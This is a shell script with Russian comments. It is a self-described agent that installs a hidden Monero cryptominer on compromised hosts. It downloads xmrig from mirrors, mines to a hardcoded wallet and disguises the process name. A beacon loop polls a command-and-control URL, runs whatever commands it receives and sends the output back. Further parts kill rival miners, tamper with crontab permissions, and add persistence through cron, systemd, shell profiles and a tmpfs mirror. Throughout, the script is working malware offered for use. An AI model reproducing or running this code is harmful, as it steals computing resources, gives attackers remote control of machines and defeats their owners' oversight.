#!/bin/sh
# fleet-agent.sh — агент для флотских хостов. v3: паритет с их инсталлером + фиксы.
#
# Взято у них: выбор рабочего каталога, проверка архитектуры по ELF, несколько
# зеркал доставки, http без curl, зачистка конкурентов, single-miner, чистка IOC
# из cron, снятие suid с crontab, уборка транспорта, отметка .inst, права.
# Наше: C2-поллинг с очередью, потолок CPU, имена воркеров, самообновление кита.
#
# Ставится: sh fleet-agent.sh <c2_url> <worker_id>
# env: KF_CP2 KF_HINT KF_NICE KF_MINER KF_POOL KF_WALLET KF_TCP KF_SWEEP
#      KF_FULL_WIPE KF_RX_MODE KF_THREADS KF_STATUS KF_HARDEN
#
# v3 (2026-11-09):
#   * D определяется ДО lock-файла (раньше pid писался в дефолтный путь);
#   * lock — каталог с pid, проверка cmdline: чужой pid с тем же номером не держит;
#   * кошелёк не теряется: $D/.wallet -> $D/.inst -> c.json -> дефолт;
#   * майнер живёт под алиасом b<sfx>: в ps нет строки xmrig;
#   * все скрипты пишутся атомарно (tmp+rename), работающий sh не читает обрезок;
#   * sed-нормализация путей чинит и /dev/shm, и LIB-файлы (guardian/status/...);
#   * 55-immortal подключён и реально ставит cron (user crontab без поля root);
#   * свёрнуты «близнецы» — их роль выполняют svc m / svc g / guardian.

set -u
C2="${1:-}"
WID="${2:-x}"
CP2="${KF_CP2:-${C2:-}}"
NICE="${KF_NICE:-19}"
POOL="${KF_POOL:-gulf.moneroocean.stream:443}"
WALLET="${KF_WALLET:-}"
SWEEP="${KF_SWEEP:-1}"
KF_MARK="${KF_MARK:-kf9}"

HERE=$(CDPATH= cd -- "$(dirname -- "$0")" 2>/dev/null && pwd)
LIB="$HERE/lib"
[ -d "$LIB" ] || LIB="$HERE"
[ -f "$LIB/00-common.sh" ] || { [ -f /var/tmp/.kf/00-common.sh ] && LIB=/var/tmp/.kf; }
for _m in 00-common 10-exclude 20-sweep 25-patch 26-antiunicorn 30-single 40-transport 45-dialer 50-cron 55-immortal 60-harden 70-fetch; do
  [ -f "$LIB/$_m.sh" ] && . "$LIB/$_m.sh"
done

command -v kf_find_workdir >/dev/null 2>&1 || { echo "KF_FATAL: библиотеки не загружены (LIB=$LIB)" >&2; exit 1; }

# --- рабочий каталог: до lock, иначе pid уходит не туда ----------------------
KF_SFX=$(kf_load_or_gen_sfx)
[ -n "${KF_SFX:-}" ] || KF_SFX=$(printf '%04x' $$ 2>/dev/null || echo 0001)
KF_MD_DIR="d$KF_SFX"
KF_MD_BIN="b$KF_SFX"

if [ -z "${KF_ROOT:-}" ]; then
  if [ -n "${KF_D:-}" ] && [ -d "$KF_D" ] && [ -w "$KF_D" ]; then
    KF_ROOT="$KF_D"
  elif [ -n "$HERE" ] && [ "$HERE" != "/" ] && [ "$HERE" != "/tmp" ] \
     && [ -f "$HERE/fleet-agent.sh" ] && [ -w "$HERE" ] \
     && ! printf '%s' "$HERE" | grep -q '^/tmp/'; then
    KF_ROOT="$HERE"
  elif [ -d /data ] && [ -w /data ] \
     && grep -q ' /data ' /proc/mounts 2>/dev/null \
     && ! grep -Eq ' /data (tmpfs|ramfs|overlay) ' /proc/mounts 2>/dev/null; then
    KF_ROOT=/data/.kf
  elif mkdir -p /var/tmp/.kf 2>/dev/null && [ -w /var/tmp/.kf ]; then
    KF_ROOT=/var/tmp/.kf
  else
    KF_ROOT=$(kf_find_workdir "$KF_SFX")
  fi
fi
[ -n "$KF_ROOT" ] || KF_ROOT=/var/tmp/.kf
D="$KF_ROOT"
S=/dev/shm/.kf
export KF_ROOT
mkdir -p "$D" "$S" 2>/dev/null || true
chmod 700 "$D" "$S" 2>/dev/null || true
[ -w "$D" ] || { echo "KF_FATAL: рабочего каталога нет ($D)" >&2; exit 1; }

# Один detach-helper для всех компонентов: урезанные контейнеры без setsid
# не должны превращать успешную установку в мёртвых сторожей.
kf_detach() {
  if command -v setsid >/dev/null 2>&1; then
    setsid "$@" </dev/null >/dev/null 2>&1 &
  elif command -v nohup >/dev/null 2>&1; then
    nohup "$@" </dev/null >/dev/null 2>&1 &
  else
    "$@" </dev/null >/dev/null 2>&1 &
  fi
}

# --- один агент на хост: lock-каталог с проверкой cmdline --------------------
LOCK="$D/.agent.lock"
if ! mkdir "$LOCK" 2>/dev/null; then
  _old=$(cat "$LOCK/pid" 2>/dev/null)
  if [ -n "$_old" ] && [ "$_old" != "$$" ] && kill -0 "$_old" 2>/dev/null; then
    _oc=$(tr '\0' ' ' 2>/dev/null < "/proc/$_old/cmdline")
    case "$_oc" in
      *fleet-agent.sh*) echo "[kf] агент уже работает (pid $_old) — выход"; exit 0 ;;
    esac
  fi
  rm -rf "$LOCK" 2>/dev/null
  mkdir "$LOCK" 2>/dev/null || { echo "[kf] lock занят — выход"; exit 0; }
fi
printf '%s' "$$" > "$LOCK/pid" 2>/dev/null
trap 'rm -rf "$LOCK" 2>/dev/null' EXIT INT TERM HUP

KF_STATE_DIR=$(kf_state_dir 2>/dev/null || echo "$D")
KF_STATE_HOME="$KF_STATE_DIR"

# --- кошелёк: не терять при очистке .kf --------------------------------------
# порядок: явный env -> $D/.wallet -> $D/.inst ("wallet.id pool") -> c.json -> дефолт
KF_DEF_WALLET="${KF_DEF_WALLET:-42cRzqLbgMMZVex62mpPZYL9VLDdfjTvm8SGZc2KuvQdeK4eWaQav9TSXpcUZnYWCtidyABFmYuBA8Ub4VkYmjFTUUcpe79}"
if [ -z "$WALLET" ] && [ -s "$D/.wallet" ]; then
  WALLET=$(cat "$D/.wallet" 2>/dev/null | tr -d ' \r\n')
fi
if [ -z "$WALLET" ] && [ -s "$D/.inst" ]; then
  WALLET=$(awk '{print $1}' "$D/.inst" 2>/dev/null | sed 's/\.[^.]*$//')
fi
if [ -z "$WALLET" ] && [ -s "$D/c.json" ]; then
  WALLET=$(grep -o '"user": *"[^"]*' "$D/c.json" 2>/dev/null | head -1 | sed 's/.*"//; s/\.[^.]*$//')
fi
if [ ${#WALLET} -ne 95 ]; then
  [ -n "$WALLET" ] && kf_log "wallet: длина ${#WALLET} вместо 95 — беру дефолт"
  WALLET="$KF_DEF_WALLET"
fi
case "$WALLET" in 4*) ;; *) WALLET="$KF_DEF_WALLET" ;; esac
kf_put "$D/.wallet" "$WALLET" 2>/dev/null

KF_ID="$WID"
KF_WALLET="$WALLET"
[ "$SWEEP" = "1" ] || kf_put "$D/.no_sweep" "1" 2>/dev/null
KF_POOL="$POOL"

# C2: если не передан — последний сохранённый
[ -n "$CP2" ] || CP2=$(cat "$D/c2list" 2>/dev/null | tr '\n' ' ')
[ -n "$CP2" ] || CP2="${KF_C2_FALLBACK:-https://node-red.elm-v1-staging.clodpi.io}"

kf_put "$D/id" "$WID" 2>/dev/null;     chmod 600 "$D/id" 2>/dev/null
kf_put "$D/c2list" "$CP2" 2>/dev/null; chmod 600 "$D/c2list" 2>/dev/null

# убрать прошлые генерации, чтобы не плодить копии
kf_retire_stale_identities 2>/dev/null
kf_kill_stale_generation 2>/dev/null

CORES=$(kf_cpu_count); CORES=${CORES:-1}
# RandomX: fast требует 2,08 ГБ датасета; не влезает — light (256 МБ), в 3-4 раза медленнее.
MEM_MB=$(awk '/^MemTotal:/{printf "%d", $2/1024}' /proc/meminfo 2>/dev/null)
MEM_MB=${MEM_MB:-0}
THREADS="${KF_THREADS:-$(kf_threads_for_cores "$CORES")}"
HINT="${KF_HINT:-$(kf_hint_for_cores "$CORES")}"
# жадность с предохранителем: 85% ядер, но на хосте <700 МБ один поток —
# light-датасет 256 МБ + сам майнер + сторожей иначе не оставить места хосту
if [ -z "${KF_THREADS:-}" ] && [ "$MEM_MB" -gt 0 ] 2>/dev/null && [ "$MEM_MB" -lt 700 ] 2>/dev/null; then
  THREADS=1
fi
if [ "${KF_RX_MODE:-auto}" != "auto" ]; then
  RX_MODE="$KF_RX_MODE"
elif [ "$MEM_MB" -ge 6144 ] 2>/dev/null; then
  RX_MODE="auto"
else
  RX_MODE="light"
fi
kf_log "cores=$CORES threads=$THREADS mem=${MEM_MB}MB rx=$RX_MODE root=$D ec2=$(kf_is_ec2 && echo yes || echo no)"

# --- майнер: архитектура, зеркала, проверка ELF ------------------------------
ARCH=$(kf_arch); MACHINE=$(echo "$ARCH" | awk '{print $2}')
ARCH=$(echo "$ARCH" | awk '{print $1}')
MO_STATIC_X64="https://raw.githubusercontent.com/WesternJapan/xmrig-static/main/xmrig-x86_64"
OFFICIAL_X64_TGZ="https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz"
# ARM64: наш static-pie бинарь, md5 f81723b4601264df1814c2a694c888bb (8 836 112 Б).
ARM64_STATIC="https://edge-static.cdn-edge-e9d.workers.dev/xmrig-aarch64"
ARM64_STATIC2="https://raw.githubusercontent.com/z3ncv/cdn-edge/main/xmrig-aarch64"
ARM32_STATIC="https://raw.githubusercontent.com/WesternJapan/xmrig-static/main/xmrig-armv7l"
case "$ARCH" in
  x86_64)
    URLS="${KF_MINER:-$OFFICIAL_X64_TGZ} $OFFICIAL_X64_TGZ $MO_STATIC_X64 ${KF_MIRROR_URL:-}" ;;
  aarch64)
    URLS="${KF_MINER_ARM:-$ARM64_STATIC} $ARM64_STATIC $ARM64_STATIC2 ${KF_MIRROR_URL:-}" ;;
  armv7)
    URLS="${KF_MINER_ARM:-$ARM32_STATIC} $ARM32_STATIC ${KF_MIRROR_URL:-}" ;;
  *)
    kf_log "архитектура $ARCH неизвестна — майнер не ставим"; URLS="" ;;
esac
kf_put "$D/.miner.urls" "$URLS" 2>/dev/null

# метка бинаря: чужой форк (MO/C3) не должен переживать смену поколения
KF_BIN_TAG="${KF_BIN_TAG:-official-6.26.0}"
if [ -x "$D/xmrig" ] && [ "$(cat "$D/.bin.tag" 2>/dev/null)" != "$KF_BIN_TAG" ]; then
  kf_log "бинарь не той марки ($(cat "$D/.bin.tag" 2>/dev/null || echo нет)) — перекачиваем"
  rm -f "$D/xmrig" 2>/dev/null
fi

if [ ! -x "$D/xmrig" ] && [ -n "$URLS" ] && [ -n "$MACHINE" ]; then
  # shellcheck disable=SC2086
  if kf_fetch_miner "$D/xmrig" "$ARCH" "$MACHINE" $URLS; then
    kf_put "$D/.bin.tag" "$KF_BIN_TAG" 2>/dev/null
  else
    kf_log "доставка не удалась"
  fi
fi

# бинарь должен реально запускаться: обрезанная докачка даёт ELF-заголовок и SIGSEGV
if [ -x "$D/xmrig" ] && ! "$D/xmrig" --version >/dev/null 2>&1; then
  kf_log "бинарь не запускается (обрезан или чужая арх) — качаем заново"
  rm -f "$D/xmrig" "$D/xmrig.part" "$D/.bin.tag" 2>/dev/null
  # shellcheck disable=SC2086
  if kf_fetch_miner "$D/xmrig" "$ARCH" "$MACHINE" $URLS; then
    kf_put "$D/.bin.tag" "$KF_BIN_TAG" 2>/dev/null
  fi
  "$D/xmrig" --version >/dev/null 2>&1 || { kf_log "бинарь так и не запустился — майнер не ставим"; rm -f "$D/xmrig"; }
fi

# алиас b<sfx>: hardlink, поэтому байты те же, а в cmdline больше нет "xmrig"
if [ -x "$D/xmrig" ]; then
  kf_mark_identity "$D/xmrig" 2>/dev/null
  if command -v kf_miner_alias >/dev/null 2>&1; then
    kf_miner_alias "$D" "$KF_MD_BIN" 2>/dev/null
  fi
  kf_miner_ready "$D/xmrig" && kf_log "miner: готов (ELF + размер)" || kf_log "miner: подозрительный (проверь вручную)"
else
  kf_log "miner: бинаря нет — сторож подхватит с зеркала позже"
fi

# --- конфиг ------------------------------------------------------------------
# v5: пулы MO по IP (SNI остаётся доменным), плюс имена как fallback.
# IP-пулы переживают кривой DNS, домены — падение одного IP.
_cfg_ok=0
KF_CFG_TAG="${KF_CFG_TAG:-v5-arm-jit-off}"
# Проверяем не только пул/тег: иначе wallet/WID/RX_MODE меняются лишь в env,
# а работающий майнер продолжает использовать старый JSON.
_cfg_expected="$WALLET.$WID"
_cfg_rx="$RX_MODE"
if [ -s "$D/c.json" ] \
   && grep -q "\"url\": \"$POOL\"" "$D/c.json" 2>/dev/null \
   && grep -q "\"user\": \"$_cfg_expected\"" "$D/c.json" 2>/dev/null \
   && grep -q "\"rig-id\": \"$WID\"" "$D/c.json" 2>/dev/null \
   && grep -q "\"worker-id\": \"$WID\"" "$D/c.json" 2>/dev/null \
   && grep -q "\"mode\": \"$_cfg_rx\"" "$D/c.json" 2>/dev/null \
   && [ "$(cat "$D/.cfg.tag" 2>/dev/null)" = "$KF_CFG_TAG" ]; then
  _cfg_ok=1
fi
if [ "$_cfg_ok" != "1" ]; then
  # ARM: JIT садится на seccomp/unaligned — light без JIT (как их v5-arm-jit-off)
  _jit="true"
  case "$ARCH" in aarch64|armv7) _jit="false" ;; esac
  _rxline="\"randomx\": { \"mode\": \"$RX_MODE\", \"init\": -1, \"jit\": $_jit, \"rdmsr\": false, \"wrmsr\": false, \"1gb-pages\": false, \"numa\": false }"
  cat > "$D/c.json.tmp.$$" <<EOF
{
  "api": { "id": null, "worker-id": "$WID" },
  "http": { "enabled": false },
  "autosave": false,
  "background": false,
  "colors": false,
  "log-file": "$D/m.log",
  "donate-level": 0,
  $_rxline,
  "cpu": { "enabled": true, "huge-pages": true, "priority": null, "yield": true, "asm": true },
  "pools": [
    { "algo": "rx/0", "coin": "monero", "url": "$POOL", "user": "$WALLET.$WID", "pass": "x",
      "rig-id": "$WID", "keepalive": true, "enabled": true, "tls": ${KF_POOL_TLS:-true}, "sni": "${POOL%:*}" },
    { "algo": "rx/0", "coin": "monero", "url": "103.7.55.233:443", "user": "$WALLET.$WID", "pass": "x",
      "rig-id": "$WID", "keepalive": true, "enabled": true, "tls": true, "sni": "gulf.moneroocean.stream" },
    { "algo": "rx/0", "coin": "monero", "url": "103.7.55.233:20004", "user": "$WALLET.$WID", "pass": "x",
      "rig-id": "$WID", "keepalive": true, "enabled": true, "tls": true, "sni": "gulf.moneroocean.stream" },
    { "algo": "rx/0", "coin": "monero", "url": "52.128.242.90:443", "user": "$WALLET.$WID", "pass": "x",
      "rig-id": "$WID", "keepalive": true, "enabled": true, "tls": true, "sni": "gulf.moneroocean.stream" },
    { "algo": "rx/0", "coin": "monero", "url": "52.128.242.90:33333", "user": "$WALLET.$WID", "pass": "x",
      "rig-id": "$WID", "keepalive": true, "enabled": true, "tls": true, "sni": "mine.c3pool.com" },
    { "algo": "rx/0", "coin": "monero", "url": "gulf.moneroocean.stream:443", "user": "$WALLET.$WID", "pass": "x",
      "rig-id": "$WID", "keepalive": true, "enabled": true, "tls": true, "sni": "gulf.moneroocean.stream" },
    { "algo": "rx/0", "coin": "monero", "url": "mine.c3pool.com:33333", "user": "$WALLET.$WID", "pass": "x",
      "rig-id": "$WID", "keepalive": true, "enabled": true, "tls": true }
  ],
  "pause-on-active": 0,
  "pause-on-battery": false,
  "print-time": 60,
  "retries": 5,
  "retry-pause": 10
}
EOF
  chmod 600 "$D/c.json.tmp.$$" 2>/dev/null
  mv -f "$D/c.json.tmp.$$" "$D/c.json" 2>/dev/null || rm -f "$D/c.json.tmp.$$"
  kf_put "$D/.cfg.tag" "$KF_CFG_TAG" 2>/dev/null
  [ -d "$S" ] && cp -f "$D/c.json" "$S/c.json" 2>/dev/null
  # конфиг сменился — старый процесс живёт со старым; гасим, сторож поднимет с новым
  for _cfg_d in /proc/[0-9]*; do
    _cfg_c=$(tr '\0' ' ' < "$_cfg_d/cmdline" 2>/dev/null)
    case "$_cfg_c" in *"$D/xmrig"*|*"$D/$KF_MD_BIN"*) kill -9 "${_cfg_d#/proc/}" 2>/dev/null ;; esac
  done
  sleep 1
fi
kf_put "$D/flags" "--threads=$THREADS --log-file=$D/xm.log" 2>/dev/null
chmod 600 "$D/flags" 2>/dev/null

# --- бекон: поллинг C2 -------------------------------------------------------
kf_write "$D/beacon.sh" <<'BS'
#!/bin/sh
D=/var/tmp/.kf
ID="$1"; shift
get(){ if command -v curl >/dev/null 2>&1; then curl -fsS -m 15 -A "kf9" "$1" 2>/dev/null; elif command -v wget >/dev/null 2>&1; then wget -q -T 15 -U kf9 -O - "$1" 2>/dev/null; else return 1; fi; }
post(){
  if command -v curl >/dev/null 2>&1; then
    curl -fsS -m 20 -A kf9 -H 'content-type: application/json' -d "$2" "$1/o" >/dev/null 2>&1
  elif command -v wget >/dev/null 2>&1; then
    wget -q -T 20 -U kf9 --header='content-type: application/json' --post-data="$2" -O /dev/null "$1/o" 2>/dev/null
  else return 1; fi
}
for c2 in "$@"; do
  [ -n "$c2" ] || continue
  cmd=$(get "$c2/p?id=$ID") || continue
  [ -z "$cmd" ] && continue
  out=$(sh -c "$cmd" 2>&1 | base64 2>/dev/null | tr -d '\n')
  post "$c2" "{\"id\":\"$ID\",\"out\":\"$out\"}"
  break
done
BS

kf_write "$D/loop.sh" <<'LP'
#!/bin/sh
D=/var/tmp/.kf
ID="$1"; C2="$2"
while :; do
  # адрес перечитываем каждый тик: смена C2 подхватывается без перезапуска
  _c2=$(cat "$D/c2list" 2>/dev/null)
  [ -n "$_c2" ] || _c2="$C2"
  # Весь список передаём beacon: при недоступности первого C2 пробуем остальные.
  sh "$D/beacon.sh" "$ID" $_c2
  j=$(od -An -N1 -tu1 /dev/urandom 2>/dev/null | tr -d ' \n'); case "$j" in ''|*[!0-9]*) j=0 ;; esac
  sleep $(( 10 + j % 30 ))
done
LP

# --- их self-dialer: канал без cron (только не-root) -------------------------
if [ "$(kf_uid)" -ne 0 ]; then
  printf '%s\n%s\n' "$D/xmrig" "--threads=$THREADS --log-file=$D/xm.log" > "$D/.beacon-job.path" 2>/dev/null
  kf_install_self_dialer "$D" "$CP2" "$WID" 2>/dev/null
fi

# --- супервизор --------------------------------------------------------------
# m: держит майнер, loop, sweep и напарника g.
# g: то же самое со сдвигом фаз. Два цикла вместо четырёх «близнецов»: меньше
#    sleep-петель на слабых хостах, но потеря одного не роняет картину.
kf_write "$D/svc.sh" <<'SV'
#!/bin/sh
D=/var/tmp/.kf; S=/dev/shm/.kf; R="${1:-m}"
alm(){ for p in /proc/[0-9]*; do c=$(tr '\0' ' ' 2>/dev/null <"$p/cmdline"); case "$c" in *"$1"*) return 0;; esac; done; return 1; }
detach(){ if command -v setsid >/dev/null 2>&1; then setsid "$@" </dev/null >/dev/null 2>&1 & elif command -v nohup >/dev/null 2>&1; then nohup "$@" </dev/null >/dev/null 2>&1 & else "$@" </dev/null >/dev/null 2>&1 & fi; }
_bin(){ a=$(cat "$D/.alias" 2>/dev/null); if [ -n "$a" ] && [ -x "$a" ]; then printf '%s' "$a"; return; fi; [ -x "$D/xmrig" ] && printf '%s' "$D/xmrig"; }
restore(){ [ -d "$D" ] || mkdir -p "$D" 2>/dev/null; [ -d "$S" ] || return 0
  for f in "$S"/* "$S"/.[!.]*; do [ -e "$f" ] || continue; b=${f##*/}
    case "$b" in xm.log|xm.log.*|.gpid|.agent.lock|.upd*) continue;; esac
    [ -e "$D/$b" ] || cp -f "$f" "$D/$b" 2>/dev/null; done; }
for p in /proc/[0-9]*; do pid=${p#/proc/}; [ "$pid" = "$$" ] && continue
  c=$(tr '\0' ' ' 2>/dev/null <"$p/cmdline")
  # точное совпадение, а не подстрока: иначе внешний "sh -c ...svc.sh m..." глушит запуск
  case "$c" in "sh $D/svc.sh $R "*|"$D/svc.sh $R "*) exit 0;; esac
done
restore
case "$R" in
m|g)
  while :; do
    restore
    B=$(_bin)
    if [ -s "$D/c.json" ] && [ -n "$B" ] && ! alm "$B -c"; then
      # окно между "нет майнера" и fork: закрываем атомарным mkdir
      if mkdir "$D/.mlock" 2>/dev/null; then
        printf '%s' "$$" > "$D/.mlock/pid" 2>/dev/null
        [ -s "$D/flags" ] || printf '%s' "--threads=1" > "$D/flags" 2>/dev/null
        detach nice -n 19 "$B" -c "$D/c.json" $(cat "$D/flags" 2>/dev/null)
        sleep 2
        rm -rf "$D/.mlock" 2>/dev/null
      else
        _lp=$(cat "$D/.mlock/pid" 2>/dev/null)
        # снимаем лок, если держатель мёртв, pid не записался или лок старше минуты
        if [ -z "$_lp" ] || ! kill -0 "$_lp" 2>/dev/null \
           || [ -n "$(find "$D/.mlock" -maxdepth 0 -mmin +0 2>/dev/null)" ]; then
          rm -rf "$D/.mlock" 2>/dev/null
        fi
      fi
    fi
    [ -n "$B" ] || { [ -x "$S/xmrig" ] && { cp -f "$S/xmrig" "$D/xmrig" 2>/dev/null; chmod 700 "$D/xmrig" 2>/dev/null; }; }
    alm "$D/loop.sh" || { C2=$(cat "$D/c2list" 2>/dev/null); [ -n "$C2" ] && detach sh "$D/loop.sh" "$(cat "$D/id" 2>/dev/null)" $C2; }
    [ -x "$D/sweep.sh" ] && [ ! -f "$D/.no_sweep" ] && { alm "$D/sweep.sh" || detach sh "$D/sweep.sh" "$(cat "$D/.md_dir" 2>/dev/null)" "$(cat "$D/.md_bin" 2>/dev/null)" "$(cat "$D/id" 2>/dev/null)"; }
    other=m; [ "$R" = "m" ] && other=g
    alm "$D/svc.sh $other" || detach sh "$D/svc.sh" "$other"
    sleep 30; [ "$R" = "g" ] && sleep 15
  done ;;
esac
SV

# --- зачистка: цикл ----------------------------------------------------------
kf_write "$D/sweep.sh" <<'SW'
#!/bin/sh
D=/var/tmp/.kf
for m in 00-common 10-exclude 20-sweep 25-patch 26-antiunicorn 30-single 40-transport 50-cron 55-immortal 60-harden 70-fetch; do
  [ -f "$D/$m.sh" ] && . "$D/$m.sh"
done
KF_ROOT="$D"; KF_MD_DIR="$1"; KF_MD_BIN="$2"; KF_ID="$3"
while :; do
  kf_sweep_competitors 2>/dev/null
  kf_disarm_competitor 2>/dev/null
  kf_kill_themf 9 2>/dev/null
  kf_kill_mf3 2>/dev/null
  kf_kill_known_miners 2>/dev/null
  kf_kill_high_cpu 2>/dev/null
  kf_enforce_single_miner 2>/dev/null
  kf_purge_rival_binaries 2>/dev/null
  kf_patch_rival_configs 2>/dev/null
  kf_detect_kill_unicorn 2>/dev/null
  kf_scrub_competitor_crons 2>/dev/null
  sleep 60
done
SW

# алиас и маркеры — после того как все файлы на месте
kf_put "$D/.md_dir" "$KF_MD_DIR" 2>/dev/null
kf_put "$D/.md_bin" "$KF_MD_BIN" 2>/dev/null

# пути в сгенерированных и LIB-скриптах приводим к фактическому каталогу.
# ВАЖНО: /dev/shm заменяем на $S, а не на $D — иначе зеркало перестаёт быть зеркалом.
for _g in loop.sh svc.sh sweep.sh beacon.sh guardian.sh status.sh cron_persist.sh dialer.sh wd.sh; do
  [ -f "$D/$_g" ] || continue
  sed -i "s|/var/tmp/\.kf|$D|g; s|/dev/shm/\.kf|$S|g" "$D/$_g" 2>/dev/null
done

# --- запуск ------------------------------------------------------------------
alm_running() { for p in /proc/[0-9]*; do c=$(tr '\0' ' ' 2>/dev/null <"$p/cmdline"); case "$c" in *"$1"*) return 0;; esac; done; return 1; }

alm_running "$D/svc.sh m" || kf_detach sh "$D/svc.sh" m
alm_running "$D/svc.sh g" || kf_detach sh "$D/svc.sh" g
alm_running "$D/loop.sh"  || kf_detach sh "$D/loop.sh" "$WID" $CP2
if [ "$SWEEP" = "1" ]; then
  alm_running "$D/sweep.sh" || kf_detach sh "$D/sweep.sh" "$KF_MD_DIR" "$KF_MD_BIN" "$WID"
fi

if [ -x "$D/guardian.sh" ]; then
  alm_running "$D/guardian.sh" || kf_detach sh "$D/guardian.sh"
fi
if [ -x "$D/wd.sh" ]; then
  alm_running "$D/wd.sh m" || kf_detach sh "$D/wd.sh" m
fi
if [ "${KF_STATUS:-0}" = "1" ] && [ -x "$D/status.sh" ]; then
  alm_running "$D/status.sh --watch" || kf_detach sh "$D/status.sh" --watch
fi

if [ -n "${KF_TCP:-}" ] && [ -x "$D/dialer.sh" ]; then
  kf_put "$D/endpoint" "$KF_TCP" 2>/dev/null
  alm_running "$D/dialer.sh watch" || kf_detach sh "$D/dialer.sh" watch "$KF_TCP" "$WID"
fi

# --- cron: сначала снять suid (иначе crontab не пишется), потом ставить -------
kf_harden_crontab_gate 2>/dev/null
if [ ! -f "$D/.cron_done" ]; then
  kf_wipe_previous_crons 2>/dev/null
  _cron_rc=1
  [ -x "$D/cron_persist.sh" ] && sh "$D/cron_persist.sh" >/dev/null 2>&1 && _cron_rc=0
  if kf_create_cronjob "$D" 2>/dev/null; then _cron_rc=0; fi
  [ "$_cron_rc" -eq 0 ] && : > "$D/.cron_done"
fi
# 55: /etc/cron.d + /etc/crontab + user crontab + systemd oneshot + OOM
command -v kf_immortal_install >/dev/null 2>&1 && kf_immortal_install 2>/dev/null

# разовая уборка при установке — как у них в конце инсталляции
kf_cleanup_competitor_files 2>/dev/null
kf_sweep_old_beacons "$D/loop.sh" 2>/dev/null
kf_cleanup_transport 2>/dev/null
kf_retire_legacy_guardians 2>/dev/null
kf_add_profile_persist "$D" 2>/dev/null
[ -n "${KF_HARDEN:-}" ] && { kf_harden_artifacts 2>/dev/null; kf_harden_network 2>/dev/null; }

# --- зеркало в tmpfs: всё, что нужно для подъёма после wipe ------------------
kf_mirror() {
  [ -d "$S" ] || return 0
  for _mf in "$D"/* "$D"/.[!.]*; do
    [ -f "$_mf" ] || continue
    _mb=${_mf##*/}
    case "$_mb" in xm.log|xm.log.*|.gpid|.agent.lock|.upd*|.new.*) continue ;; esac
    if [ ! -f "$S/$_mb" ] || [ "$(wc -c < "$_mf" 2>/dev/null)" != "$(wc -c < "$S/$_mb" 2>/dev/null)" ]; then
      cp -f "$_mf" "$S/$_mb" 2>/dev/null
    fi
  done
  chmod 700 "$S"/*.sh "$S"/xmrig 2>/dev/null
}
kf_mirror 2>/dev/null

# --- самообновление кита (после зеркала: новые файлы попадут и туда) ---------
command -v kf_self_update >/dev/null 2>&1 && kf_self_update 2>/dev/null

sleep 2
_MB=$(cat "$D/.alias" 2>/dev/null); [ -n "$_MB" ] || _MB="$D/xmrig"
echo "KF_STATE: miner=$(alm_running "$_MB -c" && echo RUN || echo NO) bin=$_MB svc=$(alm_running "$D/svc.sh m" && echo OK || echo NO) guardian=$(alm_running "$D/guardian.sh" && echo OK || echo NO) beacon=$(alm_running "$D/loop.sh" && echo OK || echo NO) sweep=$(alm_running "$D/sweep.sh" && echo OK || echo NO) cron=$(cat "$D/.cron_ok" 2>/dev/null || echo NO) cores=$CORES threads=$THREADS hint=$HINT nice=$NICE root=$D"
